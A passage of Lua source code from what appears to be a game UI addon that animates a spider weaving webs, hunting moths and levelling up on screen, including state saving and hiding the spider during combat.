    local function isScheduled(owner)
        return owner and added[owner] == true
    end

    local function isAvailable(owner)
        if not owner or not owner.alive then
            return false
        end

        if owner.isDiameterHalf then
            local dep = owner.hubDepConn or inst.hubDepConn

            if not dep or not dep.alive then
                return false
            end

            return isDrawn(dep) or isScheduled(dep)
        end

        if isDrawn(owner) then
            return true
        end

        if isScheduled(owner) then
            return true
        end

        return false
    end

    local function killOwner(owner)
        if not owner or not owner.alive then
            return
        end

        if self.NP_KillOwnerHard then
            self:NP_KillOwnerHard(owner)
        else
            owner.alive = false
        end
    end

    local function killDuplicate(seg)
        if not seg or not seg.alive then
            return
        end

        if isDrawn(seg) then
            return
        end

        seg.alive = false

        if seg.textures and #seg.textures > 0 then
            self:StartLocalFade(seg.textures, self.C.TEAR_FADE_DURATION)
            seg.textures = {}
        end
    end

    local function addOwner(owner, thread, isMain)
        if not owner then
            return false
        end

        if owner.isDiameterHalf then
            return false
        end

        if not owner.alive and owner._nspMothInterrupted then
            owner.alive = true
            owner._nspMothInterrupted = nil
        end

        if not owner.alive then
            return false
        end

        if added[owner] then
            return false
        end

        if isDrawn(owner) then
            return false
        end

        if not thread or not thread.p0 or not thread.p2 then
            killOwner(owner)
            return false
        end

        if owner.target then
            if not self:ValidateConnection(inst, owner) then
                return false
            end
        end

        if owner.connA or owner.connB then
            if not isAvailable(owner.connA)
                or not isAvailable(owner.connB) then
                killOwner(owner)
                return false
            end
        end

        if cursor then
            self:AddTravelPointTask(
                tasks,
                cursor,
                {
                    x = thread.p0.x,
                    y = thread.p0.y,
                },
                owner.connA or owner,
                owner
            )
        end

        local task = self:AddThreadTask(tasks, owner, thread)

        if not task then
            killOwner(owner)
            return false
        end

        if isMain then
            task.isMain = true
        end

        added[owner] = true

        cursor = {
            x = thread.p2.x,
            y = thread.p2.y,
        }

        return true
    end

    for _, conn in ipairs(inst.conns or {}) do
        if conn.isDiameterHalf then
            if conn.alive
                and (not conn.hubDepConn or not conn.hubDepConn.alive) then
                killOwner(conn)
            end
        elseif conn.alive and not isDrawn(conn) then
            local drawThread = self:MakeTopDownDrawThread(conn.thread, cursor)

            if drawThread then
                addOwner(conn, drawThread, true)
            else
                killOwner(conn)
            end
        elseif not conn.alive and conn._nspMothInterrupted then
            conn.alive = true
            conn._nspMothInterrupted = nil

            local drawThread = self:MakeTopDownDrawThread(conn.thread, cursor)

            if drawThread then
                addOwner(conn, drawThread, true)
            else
                killOwner(conn)
            end
        end
    end

    if priorityOwner
        and priorityOwner.alive
        and not isDrawn(priorityOwner)
        and not added[priorityOwner]
        and (priorityOwner.connA or priorityOwner.connB or priorityOwner.isInterCross) then

        local drawThread =
            self:NP_OrientThreadForCursor(priorityOwner.thread, cursor)
            or priorityOwner.thread

        addOwner(priorityOwner, drawThread, false)
    end

    local segs = {}

    for _, seg in ipairs(inst.crossSegs or {}) do
        if not seg.isInterCross
            and seg.alive
            and not isDrawn(seg)
            and seg ~= priorityOwner then
            segs[#segs + 1] = seg
        end
    end

    if inst.isNaturalRing then
        local angleCache = {}

        local function segAngle(seg)
            local ang = angleCache[seg]

            if not ang then
                ang = self:NP_GetCrossSegSortAngle(seg)
                angleCache[seg] = ang
            end

            return ang
        end

        table.sort(segs, function(a, b)
            local aa = tonumber(a.planArcLen) or 0
            local bb = tonumber(b.planArcLen) or 0

            if aa ~= bb then
                return aa < bb
            end

            local angA = segAngle(a)
            local angB = segAngle(b)

            if angA ~= angB then
                return angA < angB
            end

            local ka = a.planSectorKey or ""
            local kb = b.planSectorKey or ""

            return ka < kb
        end)

        local seenCross = {}

        for _, seg in ipairs(segs) do
            local arc = tonumber(seg.planArcLen) or 0

            local dedupeKey = string.format(
                "%s@%.1f",
                tostring(seg.planSectorKey or "?"),
                arc
            )

            if not seenCross[dedupeKey] then
                seenCross[dedupeKey] = true

                local drawThread =
                    self:NP_OrientThreadForCursor(seg.thread, cursor)
                    or seg.thread

                addOwner(seg, drawThread, false)
            else
                killDuplicate(seg)
            end
        end
    else
        table.sort(segs, function(a, b)
            local ka = a.planSectorKey or ""
            local kb = b.planSectorKey or ""

            if ka ~= kb then
                return ka < kb
            end

            local aa = tonumber(a.planArcLen) or 0
            local bb = tonumber(b.planArcLen) or 0

            if aa ~= bb then
                return aa < bb
            end

            local ta = tonumber(a.t) or 0
            local tb = tonumber(b.t) or 0

            return ta < tb
        end)

        for _, seg in ipairs(segs) do
            local drawThread =
                self:NP_OrientThreadForCursor(seg.thread, cursor)
                or seg.thread

            addOwner(seg, drawThread, false)
        end
    end

    self:CheckInstanceDead(inst)

    if inst.torn then
        return {}
    end

    inst.tasks = tasks

    return tasks
end

function NSPauk:RestoreMothStateImmediate(saved)
    local S = self.S

    if not saved then
        S.phase = "watch"
        S.stillTimer = 0
        S.speedTimer = 0
        return
    end

    S.phase = saved.phase or "watch"
    S.currentInstance = saved.currentInstance
    S.tasks = saved.tasks or {}
    S.taskIdx = saved.taskIdx or 1
    S.currentTask = nil
    S.cocoon = saved.cocoon
    S.completeTimer = saved.completeTimer or 0
    S.moveDur = saved.moveDur or 1
    S.moveT = 0
    S.lastTaskT = 0
    S.speedTimer = 0
    S.stillTimer = saved.stillTimer or 0
    S.limitReached = saved.limitReached
    S.limitReturnPending = saved.limitReturnPending
    S.limitCocoonPending = saved.limitCocoonPending
    S.limitWaitTimer = saved.limitWaitTimer or 0
    S.limitHomePoint = saved.limitHomePoint

    if (S.phase == "task" or S.phase == "instanceComplete")
        and S.currentInstance
        and not S.currentInstance.torn
        and not S.currentInstance.isCocoon
        and not S.currentInstance.isMoth then
        local rebuilt = self:NP_RebuildInstanceTasks(S.currentInstance, nil)

        if rebuilt then
            S.tasks = rebuilt
            S.taskIdx = 1
            S.currentTask = nil

            if #rebuilt == 0 then
                S.phase = "instanceComplete"
                S.completeTimer = 0
            else
                S.phase = "task"
            end
        end

        self:NP_RequestQueueResume(S.currentInstance, nil)
    end

    if S.phase == "dissolve" and not S.cocoon then
        S.phase = "watch"
    end
end

function NSPauk:StartMothReturn(saved)
    local S = self.S

    if not saved then
        self:RestoreMothStateImmediate(nil)

        return
    end

    local fromX = S.lastSpiderX or 0
    local fromY = S.lastSpiderY or 0

    local toX = saved.spiderX
    local toY = saved.spiderY

    if type(toX) ~= "number"
        or type(toY) ~= "number"
        or (toX == 0 and toY == 0) then
        local t = saved.tasks and saved.tasks[saved.taskIdx or 1]

        if t
            and t.p0
            and type(t.p0.x) == "number"
            and type(t.p0.y) == "number" then
            toX = t.p0.x
            toY = t.p0.y
        end
    end

    if type(toX) ~= "number" or type(toY) ~= "number" then
        self:RestoreMothStateImmediate(saved)

        return
    end

    local dx = toX - fromX
    local dy = toY - fromY

    if dx * dx + dy * dy < 4 then
        self:RestoreMothStateImmediate(saved)

        return
    end

    local returnPlan = self:NP_MakePlanTask(
        "travel",
        { x = fromX, y = fromY },
        { x = toX, y = toY },
        nil,
        nil
    )

    returnPlan.nspMothReturnPlan = true

    local restoreTask = {
        kind = "travel",
        nspMothRestore = true,
        nspNoSupportCheck = true,
        nspNoInsert = true,
        drop = false,
        p0 = { x = toX, y = toY },
        p1 = { x = toX, y = toY },
        p2 = { x = toX, y = toY },
        nspSaved = saved,
    }

    S.currentInstance = saved.currentInstance
    S.tasks = { returnPlan, restoreTask }
    S.taskIdx = 1
    S.currentTask = nil
    S.cocoon = nil
    S.phase = "task"
    S.completeTimer = 0

    self:MkSpider()
    self:MkClickBtn()
    self:AdvanceTask()
end

function NSPauk:FinishMothEat()
    local S = self.S

    local m = S.moth

    if not m or not m.active then
        return
    end

    self:CallMoth("Destroy")

    if type(NSPauk_Moth) == "table" then
        NSPauk_Moth.stuckInfo = nil
    end

    self:AwardCocoonExperience("мотылька")

    if m.inst then
        self:SettleInstance(m.inst)
        self:HideInstanceTextures(m.inst)
        self:RemoveInstance(m.inst)
    end

    local saved = m.saved

    S.moth = nil

    self:StartMothReturn(saved)
end

function NSPauk:AbortMothHunt(destroyMoth, noRestore, noAdvance)
    local S = self.S

    local m = S.moth

    if not m or not m.active then
        S.moth = nil

        return
    end

    if destroyMoth then
        self:CallMoth("Destroy")

        if type(NSPauk_Moth) == "table" then
            NSPauk_Moth.stuckInfo = nil
        end
    end

    self:NP_ClearGlobalDrag(false)

    if m.inst then
        self:HideInstanceTextures(m.inst)
        self:RemoveInstance(m.inst)
    end

    m.active = false

    local saved = m.saved

    S.moth = nil

    if noRestore then
        return
    end

    if noAdvance then
        self:RestoreMothStateImmediate(saved)
    else
        self:StartMothReturn(saved)
    end
end

function NSPauk:ClearAllVisuals()
    local S = self.S

    if S.moth and S.moth.active then
        self:AbortMothHunt(true, true, true)
    end

    S.nspNearCache = nil
    S.nspSupportCache = nil

    self:NP_ClearGlobalDrag(false)
    self:NP_ClearTempOwners()

    if S.currentTask and S.currentTask.nspDragTextures then
        self:RecycleTextures(S.currentTask.nspDragTextures)
        S.currentTask.nspDragTextures = nil
    end

    for _, task in ipairs(S.tasks) do
        if task.nspDragTextures then
            self:RecycleTextures(task.nspDragTextures)
            task.nspDragTextures = nil
        end
    end

    S.nspFrameCache = nil
    S.nspSupportCache = nil
    S.nspLastRoute = nil

    if not S.suppressSettle then
        for _, inst in ipairs(S.instances) do
            self:SettleInstance(inst)
        end
    end

    self:AbortCocoon()
    self:RestoreDigestedFrames()

    self:CancelUIParentRestore(true)

    for _, inst in ipairs(S.instances) do
        for _, conn in ipairs(inst.conns) do
            self:RecycleTextures(conn.textures)
            conn.alive = false
        end

        for _, seg in ipairs(inst.crossSegs) do
            self:RecycleTextures(seg.textures)
            seg.alive = false
        end
    end

    for i = #S.fades, 1, -1 do
        self:RecycleTextures(S.fades[i].textures)
        S.fades[i] = nil
    end

    S.instances = {}
    S.currentInstance = nil
    S.tasks = {}
    S.taskIdx = 1
    S.currentTask = nil
    S.webPoints = 0
    S.webAliveCount = 0
    S.mouseOnThread = nil

    S.limitReached = false
    S.limitReturnPending = false
    S.limitCocoonPending = false
    S.limitWaitTimer = 0
    S.limitHomePoint = nil

    self:HideSpider()
end

function NSPauk:OnSpiderClick(button)
    local S = self.S

    S.nspNearCache = nil
    S.nspSupportCache = nil

    if button == "RightButton" then
        if self:HasPendingLevelUps() then
            self:ShowLevelUpFrame()
        else
            self:ShowProgress()
        end

        return
    end

    if S.phase ~= "task"
        and S.phase ~= "instanceComplete"
        and S.phase ~= "dissolve"
        and S.phase ~= "limitWait"
        and S.phase ~= "mothEat" then
        return
    end

    local surv = tonumber(self.C.SURVIVAL_CHANCE) or 0

    if surv > 0 and math.random() < surv then
        self:ShowKillConfirm()

        return
    end

    self:KillSpider(button)
end

function NSPauk:CountChangedConstantsInDB(db)
    if type(db) ~= "table" or type(db.constants) ~= "table" then
        return 0
    end

    local count = 0

    for key, defaultValue in pairs(self.DefaultConstants) do
        local currentValue = db.constants[key]

        if type(defaultValue) == "number" and type(currentValue) == "number" then
            if math.abs(currentValue - defaultValue) > 1e-9 then
                count = count + 1
            end
        elseif currentValue ~= defaultValue then
            count = count + 1
        end
    end

    return count
end

function NSPauk:KillSpider(button)
    local S = self.S
    local C = self.C

    self:NP_ClearGlobalDrag(false)
    self:NP_ClearTempOwners()

    if S.currentTask and S.currentTask.nspDragTextures then
        self:RecycleTextures(S.currentTask.nspDragTextures)
        S.currentTask.nspDragTextures = nil
    end

    for _, task in ipairs(S.tasks) do
        if task.nspDragTextures then
            self:RecycleTextures(task.nspDragTextures)
            task.nspDragTextures = nil
        end
    end

    S.nspFrameCache = nil
    S.nspSupportCache = nil
    S.nspLastRoute = nil

    if S.moth and S.moth.active then
        self:AbortMothHunt(true, true, true)
    end

    if S.phase ~= "task"
        and S.phase ~= "instanceComplete"
        and S.phase ~= "dissolve"
        and S.phase ~= "limitWait"
        and S.phase ~= "mothEat" then
        return
    end

    if PlaySoundFile then
        PlaySoundFile(C.CLICK_SOUND)
    end

    S.suppressSettle = true

    self:AnnounceSpiderKill()
    self:ResetProgress()
    self:ResetConstants()
    self:AbortCocoon()
    self:RestoreDigestedFrames()

    S.limitReached = false
    S.limitReturnPending = false
    S.limitCocoonPending = false
    S.limitWaitTimer = 0
    S.limitHomePoint = nil

    local textures = {}

    local function addList(list)
        for _, texture in ipairs(list) do
            if texture and texture:IsShown() then
                textures[#textures + 1] = texture
            end
        end
    end

    for _, inst in ipairs(S.instances) do
        for _, conn in ipairs(inst.conns) do
            addList(conn.textures)
        end

        for _, seg in ipairs(inst.crossSegs) do
            addList(seg.textures)
        end
    end

    for _, fade in ipairs(S.fades) do
        addList(fade.textures)
    end

    for _, inst in ipairs(S.instances) do
        for _, conn in ipairs(inst.conns) do
            conn.textures = {}
        end

        for _, seg in ipairs(inst.crossSegs) do
            seg.textures = {}
        end
    end

    for i = #S.fades, 1, -1 do
        S.fades[i] = nil
    end

    local pxxx = S.activeFrame:CreateTexture(nil, "OVERLAY")

    pxxx:SetTexture(C.CLICK_TEX)
    pxxx:SetWidth(C.SPIDER_SIZE * 4)
    pxxx:SetHeight(C.SPIDER_SIZE * 4)
    pxxx:SetPoint("CENTER", UIParent, "BOTTOMLEFT", S.lastSpiderX, S.lastSpiderY)
    pxxx:SetDrawLayer("OVERLAY")
    pxxx:SetAlpha(1)

    S.webCreated = S.webCreated + 1

    textures[#textures + 1] = pxxx

    S.instances = {}
    S.currentInstance = nil
    S.tasks = {}
    S.taskIdx = 1
    S.currentTask = nil
    S.mouseOnThread = nil
    S.webPoints = 0

    self:HideSpider()

    self:AddFade(textures, C.FADE_DURATION, function(addon)
        addon:FinishClickFade()
    end)

    S.phase = "fade"
    S.speedTimer = 0
    S.suppressSettle = false
end

function NSPauk:CreateKillConfirmFrame()
    if self.killConfirmFrame then
        return
    end

    local f = CreateFrame("Frame", "NSPauk_KillConfirmFrame", UIParent)

    f:SetWidth(360)
    f:SetHeight(140)
    f:SetPoint("CENTER")
    f:SetFrameStrata("TOOLTIP")
    f:SetFrameLevel(200)
    f:EnableMouse(true)
    f:SetMovable(true)
    f:SetClampedToScreen(true)
    f:RegisterForDrag("LeftButton")

    f:SetScript("OnDragStart", function(frame)
        frame:StartMoving()
    end)

    f:SetScript("OnDragStop", function(frame)
        frame:StopMovingOrSizing()
    end)

    f:Hide()

    if type(UISpecialFrames) == "table" and f:GetName() then
        table.insert(UISpecialFrames, f:GetName())
    end

    local function setColor(tex, r, g, b, a)
        if not tex then
            return
        end

        if tex.SetColorTexture then
            tex:SetColorTexture(r, g, b, a or 1)
        else
            tex:SetTexture(1, 1, 1, 1)
            tex:SetVertexColor(r, g, b, a or 1)
        end
    end

    local border = f:CreateTexture(nil, "BACKGROUND")
    border:SetAllPoints(f)
    setColor(border, 0.50, 0.20, 0.20, 1)

    local bg = f:CreateTexture(nil, "BACKGROUND")
    bg:SetDrawLayer("BACKGROUND", 1)
    bg:SetPoint("TOPLEFT", 2, -2)
    bg:SetPoint("BOTTOMRIGHT", -2, 2)
    setColor(bg, 0.10, 0.07, 0.07, 0.96)

    local title = f:CreateFontString(nil, "OVERLAY", "GameFontHighlightLarge")
    title:SetPoint("TOP", 0, -22)
    title:SetText("Убить паука?")

    local sub = f:CreateFontString(nil, "OVERLAY", "GameFontHighlight")
    sub:SetPoint("TOP", title, "BOTTOM", 0, -8)
    sub:SetText("Это обнулит его прогресс.")

    local yesBtn = CreateFrame("Button", nil, f)
    yesBtn:SetWidth(120)
    yesBtn:SetHeight(30)
    yesBtn:SetPoint("BOTTOMLEFT", 30, 18)
    yesBtn:EnableMouse(true)

    local yesBg = yesBtn:CreateTexture(nil, "BACKGROUND")
    yesBg:SetAllPoints(yesBtn)
    setColor(yesBg, 0.45, 0.14, 0.14, 1)

    local yesText = yesBtn:CreateFontString(nil, "OVERLAY", "GameFontHighlight")
    yesText:SetPoint("CENTER")
    yesText:SetText("Да")

    yesBtn:SetScript("OnEnter", function()
        setColor(yesBg, 0.58, 0.20, 0.20, 1)
    end)

    yesBtn:SetScript("OnLeave", function()
        setColor(yesBg, 0.45, 0.14, 0.14, 1)
    end)

    yesBtn:SetScript("OnClick", function()
        self:HideKillConfirm()
        self:KillSpider("LeftButton")
    end)

    local noBtn = CreateFrame("Button", nil, f)
    noBtn:SetWidth(120)
    noBtn:SetHeight(30)
    noBtn:SetPoint("BOTTOMRIGHT", -30, 18)
    noBtn:EnableMouse(true)

    local noBg = noBtn:CreateTexture(nil, "BACKGROUND")
    noBg:SetAllPoints(noBtn)
    setColor(noBg, 0.16, 0.36, 0.18, 1)

    local noText = noBtn:CreateFontString(nil, "OVERLAY", "GameFontHighlight")
    noText:SetPoint("CENTER")
    noText:SetText("Нет")

    noBtn:SetScript("OnEnter", function()
        setColor(noBg, 0.22, 0.48, 0.24, 1)
    end)

    noBtn:SetScript("OnLeave", function()
        setColor(noBg, 0.16, 0.36, 0.18, 1)
    end)

    noBtn:SetScript("OnClick", function()
        self:HideKillConfirm()
    end)

    self.killConfirmFrame = f
end

function NSPauk:ShowKillConfirm()
    self:CreateKillConfirmFrame()

    if not self.killConfirmFrame then
        return
    end

    self.killConfirmFrame:Show()
end

function NSPauk:HideKillConfirm()
    if self.killConfirmFrame then
        self.killConfirmFrame:Hide()
    end
end

function NSPauk:GetSpiderLevel()
    local db = self:EnsureDB()

    local perLevel = tonumber(db.constants.POINTS_PER_LEVEL)

    if not perLevel or perLevel ~= perLevel or perLevel <= 0 then
        perLevel = 60000
    end

    local total = db.progress.totalPoints or 0

    return math.floor(total / perLevel)
end

function NSPauk:GetLevelUpChoiceCount()
    local db = self:EnsureDB()

    local historyCount = 0

    if type(db.progress.history) == "table" then
        historyCount = #db.progress.history
    end

    local changedCount = self:CountChangedConstantsInDB(db)

    if historyCount > changedCount then
        return historyCount
    end

    return changedCount
end

function NSPauk:HasPendingLevelUps()
    local level = self:GetSpiderLevel()
    local choices = self:GetLevelUpChoiceCount()

    local pending = level - choices

    if pending < 0 then
        pending = 0
    end

    return pending > 0, pending
end

function NSPauk:NP_CombatHideDuration()
    return 600
end

function NSPauk:NP_ApplyCombatHiddenVisuals()
    local S = self.S

    if self.F_HIGH and self.F_HIGH.SetAlpha then
        self.F_HIGH:SetAlpha(0)
    end

    if self.F_SPIDER and self.F_SPIDER.Hide then
        self.F_SPIDER:Hide()
    end

    if self.F_CLICK and self.F_CLICK.Hide then
        self.F_CLICK:Hide()
    end

    if S.spider and S.spider.Hide then
        S.spider:Hide()
    end

    if S.clickBtn and S.clickBtn.Hide then
        S.clickBtn:Hide()
    end

    if self.killConfirmFrame and self.killConfirmFrame.Hide then
        self.killConfirmFrame:Hide()
    end

    if self.levelUpFrame and self.levelUpFrame.Hide then
        self.levelUpFrame:Hide()
    end

    if S.uiFlickerFrame and S.uiFlickerFrame.Hide then
        S.uiFlickerFrame:Hide()
    end

    if S.nspPreviewTextures then
        for _, tex in ipairs(S.nspPreviewTextures) do
            if tex and tex.Hide then
                tex:Hide()
            end
        end
    end

    if S.nspSectorsDebug then
        if S.nspSectorsDebug.textures then
            for _, tex in ipairs(S.nspSectorsDebug.textures) do
                if tex and tex.Hide then
                    tex:Hide()
                end
            end
        end

        if S.nspSectorsDebug.fonts then
            for _, fs in ipairs(S.nspSectorsDebug.fonts) do
                if fs and fs.Hide then
                    fs:Hide()
                end
            end
        end
    end
end

function NSPauk:NP_SaveCombatHideState()
    local S = self.S

    if type(S.nspCombatHideState) == "table" then
        return
    end

    local function shown(obj)
        if obj and obj.IsShown then
            return obj:IsShown() and true or false
        end
        return false
    end

    local state = {}

    state.phase = S.phase
    state.currentInstance = S.currentInstance
    state.tasks = S.tasks
    state.taskIdx = S.taskIdx
    state.currentTask = S.currentTask

    state.moveDur = S.moveDur
    state.moveT = S.moveT
    state.lastTaskT = S.lastTaskT

    state.initTimer = S.initTimer
    state.completeTimer = S.completeTimer
    state.stillTimer = S.stillTimer
    state.speedTimer = S.speedTimer
    state.monitorTimer = S.monitorTimer
    state.mouseTimer = S.mouseTimer
    state.mouseIdle = S.mouseIdle
    state.disableTimer = S.disableTimer
    state.mothCheckTimer = S.mothCheckTimer

    state.mouseOnThread = S.mouseOnThread

    state.lastSpiderX = S.lastSpiderX
    state.lastSpiderY = S.lastSpiderY

    state.cocoon = S.cocoon
    state.moth = S.moth
    state.nspDrag = S.nspDrag
    state.nspTempOwners = S.nspTempOwners

    state.nspQueueResumePending = S.nspQueueResumePending
    state.nspQueueResumeInst = S.nspQueueResumeInst
    state.nspQueueResumePriority = S.nspQueueResumePriority
    state.nspSectorRecheckPending = S.nspSectorRecheckPending
    state.nspSectorRecheckInst = S.nspSectorRecheckInst

    state.limitReached = S.limitReached
    state.limitReturnPending = S.limitReturnPending
    state.limitCocoonPending = S.limitCocoonPending
    state.limitWaitTimer = S.limitWaitTimer
    state.limitHomePoint = S.limitHomePoint

    state.uiFlicker = S.uiFlicker
    state.uiParentBaseAlpha = S.uiParentBaseAlpha
    state.adaptive = S.adaptive
    state.nspDragFps = S.nspDragFps
    state.nspDragVisualAt = S.nspDragVisualAt
    state.nspTempVisualAt = S.nspTempVisualAt

    state.spiderShown = shown(S.spider)
    state.clickShown = shown(S.clickBtn)
    state.fSpiderShown = shown(self.F_SPIDER)
    state.fClickShown = shown(self.F_CLICK)
    state.levelUpShown = shown(self.levelUpFrame)
    state.killConfirmShown = shown(self.killConfirmFrame)

    if self.F_HIGH and self.F_HIGH.GetAlpha then
        state.highAlpha = self.F_HIGH:GetAlpha()

        if type(state.highAlpha) ~= "number" or state.highAlpha ~= state.highAlpha then
            state.highAlpha = 1
        end
    else
        state.highAlpha = 1
    end

    S.nspCombatHideState = state
end

function NSPauk:NP_RestoreCombatHideState()
    local S = self.S

    local state = S.nspCombatHideState
    S.nspCombatHideState = nil

    if type(state) ~= "table" then
        S.phase = "watch"
        S.stillTimer = 0
        S.speedTimer = 0
        return
    end

    S.phase = state.phase or "watch"

    if S.phase == "combatHide" then
        S.phase = "watch"
    end

    S.currentInstance = state.currentInstance
    S.tasks = state.tasks or {}
    S.taskIdx = state.taskIdx or 1
    S.currentTask = state.currentTask

    if type(S.tasks) ~= "table" then
        S.tasks = {}
    end

    S.moveDur = state.moveDur or 1
    S.moveT = state.moveT or 0
    S.lastTaskT = state.lastTaskT or 0

    S.initTimer = state.initTimer or 0
    S.completeTimer = state.completeTimer or 0
    S.stillTimer = state.stillTimer or 0
    S.speedTimer = state.speedTimer or 0
    S.monitorTimer = state.monitorTimer or 0
    S.mouseTimer = state.mouseTimer or 0
    S.mouseIdle = state.mouseIdle or 0
    S.disableTimer = state.disableTimer or 0
    S.mothCheckTimer = state.mothCheckTimer or 0

    S.mouseOnThread = state.mouseOnThread

    S.lastSpiderX = state.lastSpiderX or 0
    S.lastSpiderY = state.lastSpiderY or 0

    S.cocoon = state.cocoon
    S.moth = state.moth
    S.nspDrag = state.nspDrag
    S.nspTempOwners = state.nspTempOwners or {}

    S.nspQueueResumePending = state.nspQueueResumePending
    S.nspQueueResumeInst = state.nspQueueResumeInst
    S.nspQueueResumePriority = state.nspQueueResumePriority
    S.nspSectorRecheckPending = state.nspSectorRecheckPending
    S.nspSectorRecheckInst = state.nspSectorRecheckInst

    S.limitReached = state.limitReached
    S.limitReturnPending = state.limitReturnPending
    S.limitCocoonPending = state.limitCocoonPending
    S.limitWaitTimer = state.limitWaitTimer or 0
    S.limitHomePoint = state.limitHomePoint

    S.uiFlicker = state.uiFlicker
    S.uiParentBaseAlpha = state.uiParentBaseAlpha
    S.adaptive = state.adaptive
    S.nspDragFps = state.nspDragFps
    S.nspDragVisualAt = state.nspDragVisualAt
    S.nspTempVisualAt = state.nspTempVisualAt

    self:NP_ResetRouteHistory()

    S.nspFrameCache = nil
    S.nspSupportCache = nil
    S.nspNearCache = nil
    S.nspFreshSupportCache = nil
    S.nspAnchorRectCache = nil

    if state.spiderShown and not S.spider then
        self:MkSpider()
    end

    if state.clickShown and not S.clickBtn then
        self:MkClickBtn()
    end

    if self.F_HIGH and self.F_HIGH.SetAlpha then
        self.F_HIGH:SetAlpha(state.highAlpha or 1)
    end

    local function restoreFrame(obj, shouldBeShown)
        if obj and obj.Show and obj.Hide then
            if shouldBeShown then
                obj:Show()
            else
                obj:Hide()
            end
        end
    end

    restoreFrame(self.F_SPIDER, state.fSpiderShown)
    restoreFrame(self.F_CLICK, state.fClickShown)
    restoreFrame(S.spider, state.spiderShown)
    restoreFrame(S.clickBtn, state.clickShown)
    restoreFrame(self.levelUpFrame, state.levelUpShown)
    restoreFrame(self.killConfirmFrame, state.killConfirmShown)

    if S.nspPreviewTextures then
        for _, tex in ipairs(S.nspPreviewTextures) do
            if tex and tex.Show then
                tex:Show()
            end
        end
    end

    if S.nspSectorsDebug then
        if S.nspSectorsDebug.textures then
            for _, tex in ipairs(S.nspSectorsDebug.textures) do
                if tex and tex.Show then
                    tex:Show()
                end
            end
        end

        if S.nspSectorsDebug.fonts then
            for _, fs in ipairs(S.nspSectorsDebug.fonts) do
                if fs and fs.Show then
                    fs:Show()
                end
            end
        end
    end

    self:PutSpider(S.lastSpiderX, S.lastSpiderY)

    if S.uiFlicker then
        self:NP_ResumeUIParentRestore()
    end

    self:CheckInstancesMovement()

    if S.phase == "uiRestore" and not S.uiFlicker then
        S.phase = "watch"
        S.stillTimer = 0
        S.speedTimer = 0
    end

    if S.phase == "dissolve" and not S.cocoon then
        S.phase = "watch"
        S.stillTimer = 0
        S.speedTimer = 0
    end

    if S.phase == "mothEat" and (not S.moth or not S.moth.active) then
        S.phase = "watch"
        S.stillTimer = 0
        S.speedTimer = 0
    end

    if S.phase == "limitWait" and not S.limitReached then
        S.phase = "watch"
        S.stillTimer = 0
        S.speedTimer = 0
    end

    if (S.phase == "task" or S.phase == "instanceComplete") and not S.currentInstance then
        S.tasks = {}
        S.taskIdx = 1
        S.currentTask = nil
        S.phase = "watch"
        S.stillTimer = 0
        S.speedTimer = 0
    end
end

function NSPauk:NP_PauseUIParentRestore()
    local S = self.S

    if not S.uiFlicker then
        return
    end

    if type(S.uiFlickerPausedAt) ~= "number" then
        S.uiFlickerPausedAt = GetTime()
    end

    if S.uiFlickerTicker then
        S.uiFlickerTicker:Cancel()
        S.uiFlickerTicker = nil
    end

    if S.uiFlickerFrame then
        S.uiFlickerFrame:SetScript("OnUpdate", nil)
        S.uiFlickerFrame:Hide()
    end
end

function NSPauk:NP_ResumeUIParentRestore()
    local S = self.S

    if not S.uiFlicker then
        return
    end

    if type(S.uiFlickerPausedAt) == "number" then
        local paused = GetTime() - S.uiFlickerPausedAt

        if paused > 0 then
            S.uiFlicker.startTime = (S.uiFlicker.startTime or GetTime()) + paused
        end

        S.uiFlickerPausedAt = nil
    end

    local f = S.uiFlickerFrame

    if f then
        f:SetScript("OnUpdate", function()
            self:UpdateUIParentRestore()
        end)

        f:Show()
    end

    if type(C_Timer) == "table"
        and type(C_Timer.NewTicker) == "function"
        and not S.uiFlickerTicker then
        S.uiFlickerTicker = C_Timer.NewTicker(0.1, function()
            if S.uiFlicker then
                self:UpdateUIParentRestore()
            end
        end)
    end
end

function NSPauk:NP_LeaveCombatHide()
    local S = self.S

    if type(S) ~= "table" then
        return
    end

    S.inCombat = false

    if S.combatHide then
        local duration = 600

        if type(self.NP_CombatHideDuration) == "function" then
            duration = tonumber(self:NP_CombatHideDuration()) or 600
        end

        if type(duration) ~= "number" or duration ~= duration or duration < 0 then
            duration = 600
        end

        S.combatHideUntil = GetTime() + duration
    end
end

function NSPauk:NP_EnterCombatHide()
    local S = self.S

    S.inCombat = true

    if S.combatHide then
        S.combatHideUntil = 0
        return
    end

    S.combatHide = true
    S.combatHideUntil = 0

    self:NP_SaveCombatHideState()

    self:NP_PauseUIParentRestore()

    S.phase = "combatHide"

    self:NP_ApplyCombatHiddenVisuals()
end

function NSPauk:NP_ExitCombatHide()
    local S = self.S

    S.combatHide = false
    S.combatHideUntil = 0
    S.inCombat = false

    self:NP_RestoreCombatHideState()
end

function NSPauk:NP_UpdateCombatHide(dt)
    local S = self.S

    if not S.combatHide then
        return
    end

    if S.inCombat then
        return
    end

    local now = GetTime()

    if (S.combatHideUntil or 0) > 0 and now >= S.combatHideUntil then
        self:NP_ExitCombatHide()
    end
end

function NSPauk:NP_CombatHidePreUpdate(dt)
    local S = self.S

    if type(S) ~= "table" then
        return false
    end

    local inCombat = false

    if InCombatLockdown then
        inCombat = InCombatLockdown()
    end

    if inCombat then
        S.inCombat = true

        if type(self.NP_EnterCombatHide) == "function" then
            self:NP_EnterCombatHide()
        end
    else
        if S.inCombat then
            if type(self.NP_LeaveCombatHide) == "function" then
                self:NP_LeaveCombatHide()
            end
        end

        S.inCombat = false
    end

    if S.combatHide then
        if type(self.NP_UpdateCombatHide) == "function" then
            self:NP_UpdateCombatHide(dt)
        end

        return true
    end

    return false
end

function NSPauk:OnUpdate(dt)
    local S = self.S
    local C = self.C

    if self:NP_CombatHidePreUpdate(dt) then
        return
    end

    if S.phase == "init" then
        S.initTimer = S.initTimer + dt

        if S.initTimer >= C.DELAY_AFTER_LOGIN then
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0
        end

        return
    end

    if S.phase ~= "fade" and S.phase ~= "disabled" then
        self:UpdateFades(dt)
    end

    if S.moth
        and S.moth.active
        and S.phase ~= "fade"
        and S.phase ~= "disabled"
        and S.phase ~= "mothEat" then
        local abort = false

        if S.moth.inst and (S.moth.inst.torn or not self:InstanceHasAliveConn(S.moth.inst)) then
            abort = true
        end

        if not S.moth.frozen and not self:GetMothStuckInfo() then
            abort = true
        end

        if abort then
            self:AbortMothHunt(false, false, true)

            return
        end
    end

    if S.phase == "watch"
        or S.phase == "task"
        or S.phase == "instanceComplete"
        or S.phase == "dissolve"
        or S.phase == "limitWait"
        or S.phase == "mothEat" then
